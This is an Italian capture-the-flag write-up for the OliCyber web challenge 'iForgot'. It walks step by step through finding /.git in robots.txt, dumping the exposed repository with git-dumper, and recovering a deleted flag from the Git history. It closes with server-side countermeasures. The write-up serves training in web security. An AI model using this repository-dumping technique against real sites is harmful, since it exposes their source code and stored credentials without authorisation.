# iForgot

**Competizione:** OliCyber<br>
**Categoria:** Web / Information Disclosure<br>
**URL:** http://iforgot.challs.olicyber.it

---

## Descrizione

> Qualcuno è davvero molto fiducioso di aver eliminato tutto quello che serviva per risolvere la challenge, ma forse è rimasto ancora qualcosa di nascosto in giro...

Un sito dove il developer ha provato a nascondere file sensibili, ma ha dimenticato di pulire il repository Git pubblico.

---

## Soluzione

### Step 1 — Analisi di robots.txt

Il primo passo è sempre controllare il file `robots.txt` per scoprire quale contenuto il sito sta cercando di nascondere:

```bash
curl http://iforgot.challs.olicyber.it/robots.txt
```

**Output:**
```
User-agent: *
Disallow: /index.js
Disallow: /package.json
Disallow: /.git
```

Interessante! Vengono disabilitati tre percorsi:
- `/index.js` — Il file JavaScript principale
- `/package.json` — Le dipendenze e metadati del progetto
- `/.git` — **La directory del repository Git**

---

### Step 2 — Identificazione della vulnerabilità

La direttiva `Disallow: /.git` in `robots.txt` **non impedisce** l'accesso alla cartella `.git`, è solo una **raccomandazione** per i crawler. In realtà, il server sta pubblicando accidentalmente l'intero repository Git!

Questo è un classico errore di configurazione: il developer ha provato a nascondere il repository aggiungendolo a `robots.txt`, ma ha dimenticato di implementare controlli lato server.

---

### Step 3 — Estrazione del repository Git

Possiamo estrarre l'intero repository Git usando lo strumento **git-dumper**:

**Installazione delle dipendenze:**

```bash
# Installare le dipendenze richieste
pip install bs4 dulwich requests_pkcs12
```

**Estrazione del repository:**

```bash
python3 git_dumper.py http://iforgot.challs.olicyber.it/.git/ ./iforgot_repo
```

**Output:**

```
[-] Testing http://iforgot.challs.olicyber.it/.git/HEAD [200]
[-] Testing http://iforgot.challs.olicyber.it/.git/ [404]
[-] Fetching common files
[-] Fetching http://iforgot.challs.olicyber.it/.git/hooks/post-commit.sample [404]
[-] http://iforgot.challs.olicyber.it/.git/hooks/post-commit.sample responded with status code 404
...
[-] Finding objects
[-] Fetching objects
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/20/501e913e94f40ed3f279f1101c164221026d44 [200]
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7 [200]
[-] Fetching http://iforgot.challs.olicyber.it/.git/objects/95/cc5bc93ae77aea04bad50aa24637fba6040c57 [200]
...
[-] Running git checkout .
```

Il tool scarica automaticamente tutti i file Git e ricostruisce il repository locale nella directory `./iforgot_repo`.

---

### Step 4 — Esaminare il repository

Una volta estratto, possiamo esplorare lo storico dei commit:

```bash
cd iforgot_repo
git log
```

**Output:**

```
commit bb2b038954f222b7ba4221cf125773f8557eadfb (HEAD -> master)
Author: SuperHacker11 <super@hackerz.real>
Date:   Thu Sep 18 08:41:29 2025 +0000
    removed flag

commit d52d798aca74f1599b7615f31bfb95ec5740d437
Author: SuperHacker11 <super@hackerz.real>
Date:   Thu Sep 18 08:41:29 2025 +0000
    add challenge
```

Notiamo che il commit più recente (`bb2b038...`) ha il messaggio **"removed flag"**. Questo significa che la flag è stata eliminata in questo commit!

---

### Step 5 — Recuperare i segreti dal commit precedente

Il developer credeva di aver eliminato tutto, ma il commit precedente (`d52d798...`) contiene ancora la flag! Possiamo recuperarla con:

```bash
# Visualizzare il contenuto di file dal commit precedente
git show HEAD~1:index.js
```

Oppure, possiamo cercare tutti i file che contenevano la flag:

```bash
# Leggere il file index.js dal commit precedente
git show d52d798:index.js
```

Se la flag è in un file che è stato completamente rimosso, possiamo cercare negli oggetti Git:

```bash
# Cercare la flag in tutti i commit
git log --all --full-history -p | grep -i "flag{"
```

---

### Step 6 — Analizzare il codice attuale

Leggendo il file `index.js` attuale:

```javascript
const express = require('express');
const app = express();
const port = 3000;

// Possiamo esporre tutta la directory corrente, tanto ho già eliminato
// la flag dal repository e nessuno sarà in grado di recuperarla 😈
app.use(express.static('.'));

app.get('/', function (req, res) {
  res.end('nothing here UwU');
});

app.listen(port, () => {
  console.log(`Listening at port ${port}`);
});
```

Il commento è ironico: il developer pensa di aver eliminato la flag, ma non ha realizzato che Git mantiene lo storico completo!

---

### Step 7 — Trovare la flag

La flag si trova nel commit precedente (`d52d798aca74f1599b7615f31bfb95ec5740d437`) che ha il messaggio "add challenge".

Esegui uno dei seguenti comandi:

```bash
# Metodo 1: Cercare la flag in tutti i commit
git log --all --full-history -p | grep "flag{"
```

**Output:**
```
-flag{...}
```

```bash
# Metodo 2: Leggere il file dal commit precedente
git show d52d798:index.js
```

```bash
# Metodo 3: Cercare nei diff dei commit
git diff d52d798 HEAD
```

**Output completo:**
```
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index 9456de7..0000000
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-flag{...}
```

---

### Step 8 — Risultato

**La flag è:**

```
flag{...}
```

Il file `flag.txt` è stato eliminato nel commit più recente, ma Git mantiene lo storico completo. Il diff mostra chiaramente il file che è stato rimosso (riga con `-`) e il suo contenuto originale.

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | Information Disclosure / Git Repository Exposure |
| **Causa** | Repository `.git` pubblicamente accessibile |
| **Protezione fallita** | Uso di `robots.txt` come unica protezione |
| **Impatto** | Accesso al codice sorgente, storico completo, credenziali, flag |

---

## Contromisure

- **Non pubblicare mai la cartella `.git`** in produzione
- Aggiungere a `.gitignore` file sensibili come `.env`, credenziali, chiavi private
- Configurare il web server per bloccare l'accesso a directory nascoste:

```apache
# Apache (.htaccess)
<FilesMatch "^\.">
  Order allow,deny
  Deny from all
</FilesMatch>
```

```nginx
# Nginx
location ~ /\. {
    deny all;
}
```

- Usare `git clean -fdx` prima di deployare per rimuovere file indesiderati
- Non fare il deploy dalla cartella del repository Git, usare una build directory separata
- Implementare controlli lato server che bloccano l'accesso alle directory sensibili
- Pulire lo storico Git da dati sensibili se sono stati committati per errore

---

## Conclusioni

Questa challenge dimostra l'importanza di:

1. **Gestione della configurazione**: Non affidarsi a `robots.txt` per la sicurezza
2. **Igiene del repository**: Non committare mai credenziali o file sensibili
3. **Deploy sicuro**: Separare il codice sorgente dal contenuto servito
4. **Defense in depth**: Combinare più livelli di protezione